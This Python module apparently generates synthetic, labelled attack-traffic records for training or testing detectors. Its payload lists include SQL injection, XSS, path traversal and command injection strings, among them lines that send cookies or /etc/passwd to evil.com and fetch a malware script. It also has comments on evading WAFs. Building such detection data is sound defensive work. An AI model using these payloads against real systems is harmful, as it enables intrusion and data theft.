"""Attack traffic patterns for synthetic data generation."""

import random
import urllib.parse

# Browser UAs used by credential stuffing / encoded attacks to blend in
_BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.2",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
]

# SQL Injection payloads (classic + encoded variants)
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "' OR ''='",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "admin'--",
    "' OR 1=1#",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    # Encoded variants
    "%27%20OR%201%3D1--",
    "' UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
    # Double-encoded
    "%2527%2520OR%25201%253D1--",
    # Unicode tricks
    "＇ OR 1=1--",
    # Comment-based bypass
    "admin'/**/OR/**/1=1--",
    "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
]

# XSS payloads (classic + obfuscated)
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "'\"><script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
    # Encoded/obfuscated
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
    "<details open ontoggle=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    # Event handler variants
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "/etc/shadow",
    "..\\..\\windows\\system32\\config\\sam",
    # Double-encoded
    "..%252f..%252f..%252fetc/passwd",
    # Null byte injection
    "../../etc/passwd%00.jpg",
    # UTF-8 overlong encoding
    "..%c0%af..%c0%afetc/passwd",
    "....//....//....//proc/self/environ",
    "/var/log/apache2/access.log",
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "&& wget http://evil.com/malware.sh",
    "; curl http://evil.com/exfil?d=$(cat /etc/passwd | base64)",
    "$(whoami)",
    # Backtick variants
    "`id`",
    "`cat /etc/passwd`",
    # Newline injection
    "%0als -la",
    "%0a%0d cat /etc/passwd",
]

# Credential stuffing usernames/passwords
_COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test",
    "info@company.com", "admin@company.com", "support@company.com",
    "john.doe@gmail.com", "jane.smith@yahoo.com", "mike@outlook.com",
]

_COMMON_PASSWORDS = [
    "password", "123456", "admin", "qwerty", "letmein",
    "password123", "admin123", "root123", "welcome1", "P@ssw0rd",
]


class AttackPattern:
    """Defines an attack behavior pattern."""

    def __init__(self, name: str, label: str):
        self.name = name
        self.label = label

    def generate(self, hour: int) -> dict:
        """Generate a single attack request. Override in subclasses."""
        raise NotImplementedError


class SQLInjection(AttackPattern):
    def __init__(self):
        super().__init__("sql_injection", "sqli")

    def generate(self, hour: int) -> dict:
        payload = random.choice(SQLI_PAYLOADS)
        target = random.choice([
            "/api/v1/users/search",
            "/api/v1/products/search",
            "/api/v1/orders",
            "/api/v1/admin/users",
            "/api/v1/products",
        ])
        method = random.choice(["GET", "POST"])
        query = f"q={payload}" if method == "GET" else ""
        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": method,
            "path": target,
            "query_params": query,
            "headers": {
                "User-Agent": random.choice([
                    "python-requests/2.28.0", "sqlmap/1.7", "curl/8.4.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
                ]),
                "Content-Type": random.choice([
                    "application/x-www-form-urlencoded",
                    "application/json",
                ]),
            },
            "payload_size": len(payload) + random.randint(0, 100),
            "response_code": random.choice([200, 500, 403]),
            "response_size": random.randint(200, 5000),
            "response_time_ms": random.randint(100, 2000),
            "label": self.label,
        }


class XSSAttack(AttackPattern):
    def __init__(self):
        super().__init__("xss", "xss")

    def generate(self, hour: int) -> dict:
        payload = random.choice(XSS_PAYLOADS)
        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "POST",
            "path": random.choice([
                "/api/v1/users/me", "/api/v1/products",
                "/api/v1/products/{}/reviews".format(random.randint(1, 1000)),
                "/api/v1/orders",
            ]),
            "query_params": "",
            "headers": {
                "User-Agent": random.choice([
                    "Mozilla/5.0 Chrome/120.0", "curl/8.4.0",
                    "Mozilla/5.0 Firefox/121.0",
                ]),
                "Content-Type": "application/json",
            },
            "payload_size": len(payload) + random.randint(50, 200),
            "response_code": random.choice([200, 400, 403]),
            "response_size": random.randint(100, 3000),
            "response_time_ms": random.randint(50, 500),
            "label": self.label,
        }


class BruteForce(AttackPattern):
    def __init__(self):
        super().__init__("brute_force", "brute_force")
        self._attack_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def generate(self, hour: int) -> dict:
        return {
            "src_ip": self._attack_ip,  # same IP, many attempts
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "POST",
            "path": "/api/v1/auth/login",
            "query_params": "",
            "headers": {
                "User-Agent": "python-requests/2.28.0",
                "Content-Type": "application/json",
            },
            "payload_size": random.randint(50, 100),
            "response_code": 401,  # mostly failures
            "response_size": random.randint(50, 200),
            "response_time_ms": random.randint(200, 800),
            "label": self.label,
        }


class PortScan(AttackPattern):
    def __init__(self):
        super().__init__("port_scan", "port_scan")
        self._attack_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        self._port_iter = iter(range(1, 65536))

    def generate(self, hour: int) -> dict:
        try:
            port = next(self._port_iter)
        except StopIteration:
            self._port_iter = iter(range(1, 65536))
            port = next(self._port_iter)
        return {
            "src_ip": self._attack_ip,
            "dst_ip": "192.168.0.1",
            "dst_port": port,
            "method": "GET",
            "path": "/",
            "query_params": "",
            "headers": {"User-Agent": random.choice(["nmap", "masscan/1.3", ""])},
            "payload_size": 0,
            "response_code": random.choice([200, 404, 0]),  # 0 = connection refused
            "response_size": 0,
            "response_time_ms": random.randint(1, 10),
            "label": self.label,
        }


class C2Communication(AttackPattern):
    """Command & Control beacon traffic."""

    def __init__(self):
        super().__init__("c2_beacon", "c2")

    def generate(self, hour: int) -> dict:
        return {
            "src_ip": "192.168.0.30",  # compromised IoT device
            "dst_ip": f"47.91.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_port": random.choice([443, 8443, 4444, 8080]),
            "method": "POST",
            "path": f"/update/{random.randbytes(4).hex()}",
            "query_params": "",
            "headers": {
                "User-Agent": "SmartPlug/1.0",
                "Content-Type": "application/octet-stream",
            },
            "payload_size": random.randint(2048, 32768),  # large, encrypted payloads
            "response_code": 200,
            "response_size": random.randint(512, 8192),
            "response_time_ms": random.randint(100, 500),
            "label": self.label,
        }


class PathTraversal(AttackPattern):
    def __init__(self):
        super().__init__("path_traversal", "path_traversal")

    def generate(self, hour: int) -> dict:
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "GET",
            "path": f"/api/v1/files/{payload}",
            "query_params": "",
            "headers": {
                "User-Agent": random.choice(["curl/8.4.0", "python-requests/2.31.0"]),
                "Content-Type": "text/plain",
            },
            "payload_size": 0,
            "response_code": random.choice([200, 400, 403, 404]),
            "response_size": random.randint(100, 10000),
            "response_time_ms": random.randint(10, 200),
            "label": self.label,
        }


class CredentialStuffing(AttackPattern):
    """Distributed credential stuffing — multiple IPs, valid-looking requests."""

    def __init__(self):
        super().__init__("credential_stuffing", "credential_stuffing")
        # Pool of rotating IPs (botnet simulation)
        self._ip_pool = [
            f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            for _ in range(20)
        ]

    def generate(self, hour: int) -> dict:
        return {
            "src_ip": random.choice(self._ip_pool),
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "POST",
            "path": "/api/v1/auth/login",
            "query_params": "",
            "headers": {
                # Looks like a normal browser to evade detection
                "User-Agent": random.choice(_BROWSER_UAS),
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
            },
            "payload_size": random.randint(80, 150),
            "response_code": random.choice([401, 401, 401, 200]),  # mostly fail, occasional success
            "response_size": random.randint(50, 300),
            "response_time_ms": random.randint(100, 400),
            "label": self.label,
        }


class APIAbuse(AttackPattern):
    """Systematic API enumeration / ID scraping."""

    def __init__(self):
        super().__init__("api_abuse", "api_abuse")
        self._attack_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        self._id_counter = 0

    def generate(self, hour: int) -> dict:
        self._id_counter += 1
        target = random.choice([
            f"/api/v1/users/{self._id_counter}",
            f"/api/v1/orders/{self._id_counter}",
            f"/api/v1/files/{self._id_counter}",
        ])
        return {
            "src_ip": self._attack_ip,
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "GET",
            "path": target,
            "query_params": "",
            "headers": {
                "User-Agent": "python-requests/2.31.0",
                "Content-Type": "application/json",
                "Authorization": f"Bearer eyJ{random.randbytes(10).hex()}",
            },
            "payload_size": 0,
            "response_code": random.choice([200, 200, 403, 404]),
            "response_size": random.randint(200, 5000),
            "response_time_ms": random.randint(5, 50),  # very fast, automated
            "label": self.label,
        }


class SlowPost(AttackPattern):
    """Slow POST / Slowloris-style denial of service."""

    def __init__(self):
        super().__init__("slow_post", "slow_post")
        self._attack_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def generate(self, hour: int) -> dict:
        return {
            "src_ip": self._attack_ip,
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "POST",
            "path": random.choice([
                "/api/v1/files/upload",
                "/api/v1/orders",
                "/api/v1/auth/login",
            ]),
            "query_params": "",
            "headers": {
                "User-Agent": "Mozilla/5.0 Chrome/120.0.0.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(random.randint(100000, 1000000)),  # claims large body
            },
            "payload_size": random.randint(10, 50),  # actual body is tiny
            "response_code": random.choice([408, 400, 200]),  # timeout, bad request
            "response_size": random.randint(0, 200),
            "response_time_ms": random.randint(10000, 60000),  # very slow
            "label": self.label,
        }


class EncodedPayload(AttackPattern):
    """Attack payloads hidden via encoding to bypass WAF."""

    def __init__(self):
        super().__init__("encoded_payload", "encoded_payload")

    def generate(self, hour: int) -> dict:
        # Pick a base attack and encode it
        base_payloads = [
            ("sqli", "' OR 1=1--"),
            ("xss", "<script>alert(1)</script>"),
            ("cmd", "; cat /etc/passwd"),
            ("traversal", "../../etc/passwd"),
        ]
        attack_type, base = random.choice(base_payloads)

        # Apply random encoding
        encoding = random.choice(["url", "double_url", "base64_url", "unicode"])
        if encoding == "url":
            payload = urllib.parse.quote(base)
        elif encoding == "double_url":
            payload = urllib.parse.quote(urllib.parse.quote(base))
        elif encoding == "base64_url":
            import base64
            payload = base64.b64encode(base.encode()).decode()
        else:  # unicode
            payload = base.replace("'", "＇").replace("<", "＜").replace(">", "＞")

        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": random.choice(["GET", "POST"]),
            "path": random.choice([
                "/api/v1/products/search",
                "/api/v1/users/search",
                "/api/v1/files/upload",
            ]),
            "query_params": f"q={payload}",
            "headers": {
                "User-Agent": random.choice(_BROWSER_UAS),
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            "payload_size": len(payload) + random.randint(20, 100),
            "response_code": random.choice([200, 400, 403, 500]),
            "response_size": random.randint(100, 3000),
            "response_time_ms": random.randint(50, 500),
            "label": self.label,
        }


# All available attack patterns with relative weights
DEFAULT_ATTACKS = [
    (SQLInjection(), 0.18),
    (XSSAttack(), 0.12),
    (BruteForce(), 0.15),
    (PortScan(), 0.08),
    (C2Communication(), 0.10),
    (PathTraversal(), 0.10),
    (CredentialStuffing(), 0.10),
    (APIAbuse(), 0.07),
    (SlowPost(), 0.05),
    (EncodedPayload(), 0.05),
]
